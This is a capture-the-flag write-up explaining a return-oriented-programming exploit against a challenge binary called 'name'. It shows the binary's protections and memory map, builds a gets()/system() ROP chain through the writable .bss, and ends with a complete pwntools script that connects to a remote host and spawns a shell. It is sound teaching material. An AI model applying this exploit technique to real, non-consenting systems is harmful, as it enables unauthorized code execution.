# name

###### This challenge is about a classical ret2libc. However you don't have to leak libc addreses, because the
###### ```system()``` function is used, and we now the got address.
A look at the program protections confirms, that pie is disabled.
```
[*] '/pwd/vulncon/pwn/name/challenge/name'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
So we now ```system()```, but we still need the `/bin/sh` string. So we take a look at the program's memory
mappings:
```
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /pwd/vulncon/pwn/name/challenge/name
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /pwd/vulncon/pwn/name/challenge/name
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /pwd/vulncon/pwn/name/challenge/name
0x00007f3306e38000 0x00007f330701f000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.27.so
0x00007f330701f000 0x00007f330721f000 0x00000000001e7000 --- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007f330721f000 0x00007f3307223000 0x00000000001e7000 r-- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007f3307223000 0x00007f3307225000 0x00000000001eb000 rw- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007f3307225000 0x00007f3307229000 0x0000000000000000 rw- 
0x00007f3307229000 0x00007f3307250000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.27.so
0x00007f3307444000 0x00007f3307446000 0x0000000000000000 rw- 
0x00007f3307450000 0x00007f3307451000 0x0000000000027000 r-- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007f3307451000 0x00007f3307452000 0x0000000000028000 rw- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007f3307452000 0x00007f3307453000 0x0000000000000000 rw- 
0x00007fffa7627000 0x00007fffa7648000 0x0000000000000000 rw- [stack]
0x00007fffa7761000 0x00007fffa7765000 0x0000000000000000 r-- [vvar]
0x00007fffa7765000 0x00007fffa7767000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
```
So we see that the region `0x601000 - 0x602000` is writeable. So we could store our string `/bin/sh` there.
But how? So in the program `gets()` is used, and it takes only one argument. And that argument is, where the
user input should be written to. But we can control this argument with a gadget and write wherever we have write
permissions. So we could just call `gets(0x601000)`, read your sh string, and then call `system(0x601000)` to get a shell. Sounds like a good plan! For this we need a ropchain like this: 
```passwd + offset + pop_rdi + bss + gets + pop_rdi + bss + system```.
- **passwd**: the password we need to enter, that the `main()` function returns. We can get it easily with `strings`. It's `w3lc0m3`. We have to add a NULL byte after the password, so that `strcmp()` stops comparing at the NULL byte.
- **offset**: the offset to fill the stack right before the saved rip.
- **bss**: this is the address, where we're going to write to.
- **gets**: when the arguments are prepared, we can call gets to read our input into `0x601000`.
- **system**: when the arguments are prepared, we can call system to execute `/bin/sh`.

###### if we send a ropchain like this to the server, the program waits for input. So if we send `sh`, system is
###### called, and we get `/bin/sh` executed. This is the full exploit:
####

```python
from pwn import *

#p = process("./name")
p = remote("34.121.19.183", 49158)

gets = 0x400600
bss = 0x601000
system = 0x4005d0
main = 0x400717
pop_rdi = 0x400833
ret = 0x4005b6

p.sendline("w3lc0m3\x00" + "A"*128 + p64(pop_rdi) + p64(bss) + p64(gets) + p64(pop_rdi) + p64(bss) + p64(system) + "\x00")
p.sendline("sh")
p.interactive()
```

If we execute it, we get a shell! Nice!
